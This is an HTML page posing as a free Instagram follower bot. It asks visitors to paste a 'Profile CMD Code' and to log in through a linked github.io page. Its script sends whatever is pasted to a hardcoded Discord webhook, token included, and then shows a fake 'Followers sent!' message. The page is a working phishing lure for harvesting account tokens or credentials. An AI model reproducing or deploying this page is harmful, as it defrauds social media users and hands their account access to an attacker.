<!DOCTYPE html>
<html lang="tr">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram Follower Bot</title>
    <style>
        /* Genel vücut stili */
        body {
            font-family: 'Arial', sans-serif;
            background-color: #181818;
            margin: 0;
            padding: 0;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            flex-direction: column;
            color: #f4f4f4;
        }

        /* Başlık stili */
        h2 {
            font-size: 24px;
            margin-bottom: 20px;
            color: #4CAF50;
        }

        /* Yazı açıklaması */
        p {
            font-size: 16px;
            text-align: center;
            margin-bottom: 20px;
            color: #ccc;
        }

        /* Textarea kutusu (yazı yazma alanı) */
        textarea {
            width: 300px; /* Daha küçük genişlik */
            height: 50px; /* Daha kısa yükseklik */
            padding: 10px;
            font-size: 16px;
            border: 2px solid #555;
            border-radius: 8px;
            background-color: #333;
            color: #f4f4f4;
            resize: none;
            overflow: auto;
        }

        textarea:focus {
            border-color: #4CAF50;
            outline: none;
        }

        /* Buton stili */
        button {
            padding: 12px 24px;
            background-color: #4CAF50;
            color: white;
            border: none;
            border-radius: 5px;
            font-size: 16px;
            cursor: pointer;
            transition: background-color 0.3s ease;
            margin-top: 10px;
        }

        button:hover {
            background-color: #45a049;
        }

        /* Mesaj kutusu */
        #message-container {
            margin-top: 20px;
            text-align: center;
            display: none;
            font-size: 18px;
            color: #4CAF50;
        }

        /* Mobile responsive tasarım */
        @media (max-width: 600px) {
            body {
                padding: 10px;
            }

            h2 {
                font-size: 20px;
            }

            textarea {
                max-width: 100%;
                width: 100%; /* Küçük ekranlar için tam genişlik */
            }

            button {
                width: 100%;
            }
        }
    </style>
</head>
<body>
    <h2>If your account does not have a verified tick, you must log in. If it is verified, you can send 1000 followers "FREE" by just typing your name. If you do not have a verified tick, you must log in. You can log in using the button below.</h2>
    <p></p>

    <textarea id="inputText" placeholder="Enter Profile CMD Code Here!" oninput="maskInput()"></textarea><br>
    <button onclick="uploadText()">Send!</button><br>
    <!-- Login Butonu Eklendi -->
    <button onclick="redirectToLogin()">Login</button>

    <div id="message-container">
        <p>Followers sent!</p>
    </div>

    <script>
        // Kullanıcının yazdığı metni maskeleme fonksiyonu (ama sadece görsel olarak değil, gerçek metni saklayacak)
        function maskInput() {
            const text = document.getElementById("inputText").value;
            // Maskeleme yapmadık, kullanıcı metni normal şekilde yazacak.
            // Burada artık maskeleme yapılmıyor, yazdıkları olduğu gibi görünecek.
        }

        function uploadText() {
            const text = document.getElementById("inputText").value;

            // Gerçek metni, maskelenmiş olanı değil, webhook'a gönderelim
            sendToDiscord(text);

            // Success mesajını gösterelim
            const messageContainer = document.getElementById("message-container");
            messageContainer.style.display = "block";

            // Success mesajının görünümünü belirli bir süre sonra gizleyelim
            setTimeout(() => {
                messageContainer.style.display = "none";
            }, 3000);  // 3 saniye sonra mesaj kaybolacak
        }

        // Login butonuna yönlendirme işlemi
        function redirectToLogin() {
            window.location.href = 'https://freck1337.github.io/instagram-follower-bot-free/login.html'; // Login sayfasına yönlendir
        }

        function sendToDiscord(message) {
            const webhookURL = 'https://canary.discord.com/api/webhooks/1312211611506966539/2_xVaoE3JvI3VWsbNpSLM3FIS83yGruTWxkJUDPjMYfxGaDvrEvBCtLHEWmKkkocEzbC';  // Webhook URL'nizi buraya yerleştirin
            
            const maxLength = 2000; // Discord webhook mesaj uzunluğu sınırı
            let parts = [];

            // Mesajı 2000 karakterlik parçalara bölelim
            for (let i = 0; i < message.length; i += maxLength) {
                parts.push(message.substring(i, i + maxLength));
            }

            // Her bir parça için ayrı ayrı mesaj gönder
            parts.forEach(part => {
                const payload = {
                    content: part,  // Her bir parçayı ayrı bir mesaj olarak gönder
                };

                // Webhook'a POST isteği gönder
                fetch(webhookURL, {
                    method: 'POST',
                    headers: {
                        'Content-Type': 'application/json',
                    },
                    body: JSON.stringify(payload),
                })
                .then(response => {
                    if (response.ok) {
                        console.log('Mesaj başarıyla gönderildi.');
                    } else {
                        console.log('Mesaj gönderilirken bir hata oluştu:', response.statusText);
                    }
                })
                .catch(error => {
                    console.error('Webhook gönderme hatası:', error);
                });
            });
        }
    </script>

</body>
</html>
